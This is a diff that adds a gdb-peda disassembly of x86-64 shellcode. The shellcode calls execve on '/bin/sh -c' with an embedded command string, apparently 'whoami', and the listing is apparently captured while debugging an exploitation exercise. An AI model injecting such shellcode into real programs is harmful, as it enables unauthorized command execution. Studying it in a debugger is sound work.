@@ -1,0 +1,19 @@
+=> 0x555555558040 <shellcode>:  push   0x3b
+   0x555555558042 <shellcode+2>:        pop    rax
+   0x555555558043 <shellcode+3>:        cdq
+   0x555555558044 <shellcode+4>:        movabs rbx,0x68732f6e69622f
+   0x55555555804e <shellcode+14>:       push   rbx
+   0x55555555804f <shellcode+15>:       mov    rdi,rsp
+   0x555555558052 <shellcode+18>:       push   0x632d
+   0x555555558057 <shellcode+23>:       mov    rsi,rsp
+   0x55555555805a <shellcode+26>:       push   rdx
+   0x55555555805b <shellcode+27>:       call   0x555555558067 <shellcode+39>
+   0x555555558060 <shellcode+32>:       ja     0x5555555580ca
+   0x555555558062 <shellcode+34>:       outs   dx,DWORD PTR ds:[rsi]
+   0x555555558063 <shellcode+35>:       (bad)
+   0x555555558064 <shellcode+36>:       ins    DWORD PTR es:[rdi],dx
+   0x555555558065 <shellcode+37>:       imul   eax,DWORD PTR [rax],0x89485756
+   0x55555555806b <shellcode+43>:       out    0xf,al
+   0x55555555806d <shellcode+45>:       add    eax,0x0
+gdb-peda$ x/17i $rip
+
